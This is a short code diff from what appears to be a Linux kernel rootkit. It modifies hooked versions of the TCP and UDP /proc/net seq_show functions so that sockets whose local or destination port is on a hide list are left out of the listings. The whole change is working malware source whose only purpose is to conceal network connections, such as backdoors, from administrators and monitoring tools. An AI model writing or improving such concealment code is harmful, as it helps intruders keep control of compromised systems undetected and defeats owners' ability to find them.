@@ -206,7 +206,7 @@ static int fake_tcp4_seq_show(struct seq_file *seq, void *v)
         return real_tcp4_seq_show(seq, v);
 
     for (i = 0; i < hide_ports_count; i++) {
-        if (sk->sk_num == hide_ports[i])
+        if (sk->sk_num == hide_ports[i] || sk->sk_dport == hide_ports[i])
             return 0;
     }
 
@@ -222,7 +222,7 @@ static int fake_udp4_seq_show(struct seq_file *seq, void *v)
         return real_udp4_seq_show(seq, v);
 
     for (i = 0; i < hide_ports_count; i++) {
-        if (sk->sk_num == hide_ports[i])
+        if (sk->sk_num == hide_ports[i] || sk->sk_dport == hide_ports[i])
             return 0;
     }
 
